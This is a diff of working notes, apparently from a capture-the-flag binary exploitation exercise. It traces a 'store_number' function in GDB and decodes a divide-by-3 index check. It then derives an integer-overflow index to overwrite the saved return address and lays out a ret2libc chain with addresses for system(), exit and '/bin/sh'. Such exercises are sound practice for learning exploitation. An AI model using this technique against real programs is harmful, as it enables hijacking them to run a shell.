@@ -63,3 +63,67 @@ b *get_unum+51
 saved eip 0x8048656
 0xffffd3fc:     0x08048656
 92/4 = 23 octets
+
+b *store_number+38
+b *store_number+59
+
+eax            0x72     114
+ecx            0x72     114
+edx            0xaaaaaaab       -1431655765
+
+eax            0x72     114
+ecx            0x72     114
+edx            0xaaaaaaab       -1431655765
+
+0x08048678 <+72>:    mul    %edx
+
+eax            0x26     38
+ecx            0x72     114
+edx            0x4c     76
+
+Le résultat est stocké sur 64 bits, réparti entre %eax (partie basse) et %edx (partie haute)
+
+01001100 = 76
+00100110 = 38
+
+0x0804867a <+74>:    shr    %edx
+edx            0x26     38
+
+
+0x0804867c <+76>:    mov    %edx,%eax
+eax            0x26     38
+ecx            0x72     114
+edx            0x26     38
+
+ 0x0804867e <+78>:    add    %eax,%eax
+eax            0x4c     76
+
+0x08048680 <+80>:    add    %edx,%eax
+eax            0x72     114
+
+0x08048682 <+82>:    mov    %ecx,%edx
+eax            0x72     114
+ecx            0x72     114
+edx            0x72     114
+
+0x08048684 <+84>:    sub    %eax,%edx
+edx            0x0      0
+
+eax            0x1cc    460
+
+edx            0x2a     42
+
+nombre * 0xaaaaaaab >> 33 ≈ nombre / 3
+
+4,294,967,296 / 4 + 114 = 1073741938
+
+0xffffd454 data ? + 4 = data[1] 0xffffd458 = 4294956120
+
+
+Ret2libc = address of system() + return address for system() + address of "/bin/sh"
+
+
+0x f7e6aed0 = 4159090384 system 114 1073741938
+0x f7e5eb70 = 4159040368 exit   115
+0x f7f897ec = 4160264172 bin/sh 116
+
